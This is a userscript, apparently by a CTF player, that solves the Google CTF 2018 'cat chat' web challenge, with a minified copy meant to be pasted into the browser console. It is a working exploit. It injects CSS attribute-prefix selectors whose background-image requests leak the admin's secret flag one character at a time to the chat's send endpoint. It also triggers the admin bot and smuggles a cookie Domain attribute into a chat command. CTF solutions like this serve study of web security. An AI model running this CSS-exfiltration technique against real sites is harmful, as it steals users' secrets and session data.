// ==UserScript==
// @name         google-ctf-2018 cat talks;
// @namespace    http://tampermonkey.net/
// @version      13.77
// @description  Solution for Google Capture The Flag web challange
// @author       terjanq
// @homepage     http://github.com/terjanq
// @match        https://cat-chat.web.ctfcompetition.com/room/*
// @grant        none
// ==/UserScript==

(function(){
  let pref = 'aa]{}#conversation{overflow-x:hidden}';
  let suf = 'a[x=';
  let flag_style = 'span[data-name=flag], span[data-name=flag] + span{color:red; font-size: 15px}';
  let solve = false;
  window.flag = 'CTF{';
  window.messagebox.placeholder = '!solve type to make machine start';
  let h1 = document.createElement('h1');h1.innerHTML='🔒 The Secret Stealer 🔒';
  document.querySelector('#conversation p').before(h1);

  window.report = () => {
      window.grecaptcha.execute(recaptcha_id, {action: 'report'}).then((token) => send('/report ' + token));
  }

  window.sendMessage = function(name, msg){
    fetch(`send?name=${encodeURIComponent(name)}&msg=${encodeURIComponent(msg)}`);
  }

  window.showDogLove = (name) => sendMessage(name, 'I ❤ dogs!');

  window.template = function(middle=''){
      var res = '';
      var alph = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!-?@_{}~';
      for (let c of alph){
          let _flag = (window.flag + c).replace(/{/g, '\\7b').replace(/}/g, '\\7d');
          res += `span[data-secret^=${_flag}]{background:url(send?name=flag&msg=${_flag})}`;
      }
      return pref+middle+res+suf;
  }

  function autoFetch() {
    let last = window.conversation.lastElementChild;
    var interval = setInterval(function() {
      var p;
      while (p = last.nextElementSibling) {
        last = p;

        if (p.tagName != 'P' || p.children.length < 2) continue;
        let name = p.children[0].innerText;
        let msg = p.children[1].innerText;

        if(msg == '!solve'){
            solve = true;
            sendMessage('bot', "I has made the machine start!");  
            window.report();
            break;
        }
        if(!solve) break;

        if(/CTF{.+}/.test(window.flag)) {
            setTimeout(sendMessage, 1000, 'flag', window.flag);
            solve=false;
            clearInterval(interval);
            break;
        }

        if(name == 'flag'){
            window.flag = msg;
            window.showDogLove(template());
            break;
        }
        if(name == 'admin'){
            if(msg == 'Bye') window.report();
            if(msg.startsWith("I've been notified")){
                window.showDogLove(template(flag_style));
                window.showDogLove('/secret 123; Domain=asdasd'); 
            }
            break;
        }
      }
    }, 100);
  }

  autoFetch();

})()

// Compressed function to paste inside the console.
// (function(){let f=!1;window.flag='CTF{',window.messagebox.placeholder='!solve type to make machine start';let g=document.createElement('h1');g.innerHTML='\uD83D\uDD12 The Secret Stealer \uD83D\uDD12',document.querySelector('#conversation p').before(g),window.report=()=>{window.grecaptcha.execute(recaptcha_id,{action:'report'}).then(h=>send('/report '+h))},window.sendMessage=function(h,i){fetch(`send?name=${encodeURIComponent(h)}&msg=${encodeURIComponent(i)}`)},window.showDogLove=h=>sendMessage(h,'I \u2764 dogs!'),window.template=function(h=''){var i='';for(let k of'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!-?@_{}~'){let l=(window.flag+k).replace(/{/g,'\\7b').replace(/}/g,'\\7d');i+=`span[data-secret^=${l}]{background:url(send?name=flag&msg=${l})}`}return'aa]{}#conversation{overflow-x:hidden}'+h+i+'a[x='},function(){let h=window.conversation.lastElementChild;var i=setInterval(function(){for(var j;j=h.nextElementSibling;)if(h=j,!('P'!=j.tagName||2>j.children.length)){let k=j.children[0].innerText,l=j.children[1].innerText;if('!solve'==l){f=!0,sendMessage('bot','I has made the machine start!'),window.report();break}if(!f)break;if(/CTF{.+}/.test(window.flag)){setTimeout(sendMessage,1e3,'flag',window.flag),f=!1,clearInterval(i);break}if('flag'==k){window.flag=l,window.showDogLove(template());break}if('admin'==k){'Bye'==l&&window.report(),l.startsWith('I\'ve been notified')&&(window.showDogLove(template('span[data-name=flag], span[data-name=flag] + span{color:red; font-size: 15px}')),window.showDogLove('/secret 123; Domain=asdasd'));break}}},100)}()})();